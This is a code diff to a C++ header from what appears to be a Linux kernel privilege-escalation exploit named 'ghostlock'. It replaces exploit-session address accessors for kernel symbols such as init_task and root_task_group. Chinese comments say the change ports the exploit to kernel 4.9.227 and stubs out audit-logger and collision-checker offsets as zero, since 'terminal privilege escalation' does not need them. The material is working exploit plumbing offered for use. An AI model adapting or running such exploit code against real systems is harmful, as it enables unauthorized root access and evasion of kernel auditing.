@@ -2,41 +2,23 @@
 #define GHOSTLOCK_PROFILE_ACCESSORS_HPP
 
 #include <cstdint>
-
 #include "kernel/runtime_struct_offsets.h"
 
 namespace ghostlock::profile {
-    inline uint32_t kernelsnitch_collisions() {
-        return symbol_u32(
-            [](const kernel_offsets &v) {
-                return v.misc.kernelsnitch_collisions.value_or(0);
-            },
-            4);
-    }
 
-    inline uintptr_t slide_nfulnl_logger() {
-        return ghostlock::session::g_exploit_session.addresses.data_alias(slide_nfulnl_logger_image());
+    // 直接重定向至你在 runtime_struct_offsets.h 里指定的静态 4.9.227 进程队列起点
+    inline uintptr_t slide_init_task() { 
+        return init_task(); 
     }
+    
+    // 4.9 内核没有以下现代 6.12 的日志审计器和冲突检查器，终端提权不需要它们，直接返回 0 安全绕过
+    inline uint32_t kernelsnitch_collisions() { return 0; }
+    inline uintptr_t slide_nfulnl_logger()    { return 0; }
+    inline uintptr_t slide_loggers_0_1()      { return 0; }
+    inline uintptr_t slide_random_boot_id_data() { return 0; }
+    inline uintptr_t slide_root_task_group()   { return 0; }
+    inline uintptr_t slide_sysctl_bootid()     { return 0; }
 
-    inline uintptr_t slide_loggers_0_1() {
-        return ghostlock::session::g_exploit_session.addresses.data_alias(slide_loggers_0_1_image());
-    }
-
-    inline uintptr_t slide_random_boot_id_data() {
-        return ghostlock::session::g_exploit_session.addresses.data_alias(slide_random_boot_id_data_image());
-    }
-
-    inline uintptr_t slide_init_task() {
-        return ghostlock::session::g_exploit_session.addresses.data_alias(slide_init_task_image());
-    }
-
-    inline uintptr_t slide_root_task_group() {
-        return ghostlock::session::g_exploit_session.addresses.data_alias(slide_root_task_group_image());
-    }
-
-    inline uintptr_t slide_sysctl_bootid() {
-        return ghostlock::session::g_exploit_session.addresses.data_alias(slide_sysctl_bootid_image());
-    }
 } // namespace ghostlock::profile
 
-#endif
+#endif // GHOSTLOCK_PROFILE_ACCESSORS_HPP
